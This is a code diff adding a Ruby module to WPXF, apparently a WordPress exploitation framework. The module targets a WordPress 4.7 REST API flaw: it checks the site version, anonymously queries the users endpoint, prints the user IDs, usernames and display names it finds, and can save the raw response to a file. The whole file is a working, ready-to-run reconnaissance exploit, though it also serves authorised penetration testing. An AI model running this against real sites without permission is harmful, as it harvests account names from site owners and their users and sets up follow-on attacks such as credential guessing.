@@ -1,0 +1,96 @@
+class Wpxf::Auxiliary::Wp47UserInfoDisclosure < Wpxf::Module
+  include Wpxf
+
+  def initialize
+    super
+
+    update_info(
+      name: 'WordPress 4.7 - User Information Disclosure via REST API',
+      desc: %(
+        The new WordPress REST API allows anonymous access. One of the functions that
+        it provides, is that anyone can list the users on a WordPress website without
+        registering or having an account.
+      ),
+      author: [
+        'Rob Carr <rob[at]rastating.com>' # WPXF module
+      ],
+      references: [
+        ['WPVDB', '8715'],
+        ['URL', 'https://github.com/WordPress/WordPress/commit/daf358983cc1ce0c77bf6d2de2ebbb43df2add60']
+      ],
+      date: 'Jan 11 2017'
+    )
+
+    register_options([
+      StringOption.new(
+        name: 'export_path',
+        desc: 'The file to save the export to',
+        required: false
+      )
+    ])
+  end
+
+  def check
+    version = wordpress_version
+    return :unknown if version.nil?
+    return :vulnerable if version == Gem::Version.new('4.7')
+    :safe
+  end
+
+  def export_path
+    return nil if normalized_option_value('export_path').nil?
+    File.expand_path normalized_option_value('export_path')
+  end
+
+  def users_api_url
+    normalize_uri(full_uri, 'wp-json', 'wp', 'v2', 'users')
+  end
+
+  def call_users_api
+    res = execute_get_request(url: users_api_url)
+
+    if res.nil?
+      emit_error 'No response from the target'
+      return nil
+    end
+
+    if res.code != 200
+      emit_error "Server responded with code #{res.code}"
+      return nil
+    end
+
+    res
+  end
+
+  def output_user_list(api_output)
+    headers = [{ id: 'ID', username: 'Username', name: 'Name' }]
+    rows = []
+
+    users = JSON.parse(api_output)
+    users.each do |user|
+      rows.push(id: user['id'], username: user['slug'], name: user['name'])
+    end
+
+    rows.sort_by! { |row| row[:id] }
+    emit_table headers.concat(rows)
+  end
+
+  def run
+    return false unless super
+
+    emit_info 'Calling the users API...'
+    res = call_users_api
+    return false if res.nil?
+
+    emit_info 'Parsing result...', true
+    output_user_list res.body
+
+    if export_path
+      emit_info 'Saving export...'
+      File.open(export_path, 'w') { |file| file.write(res.body) }
+      emit_success "Saved export to #{export_path}"
+    end
+
+    true
+  end
+end
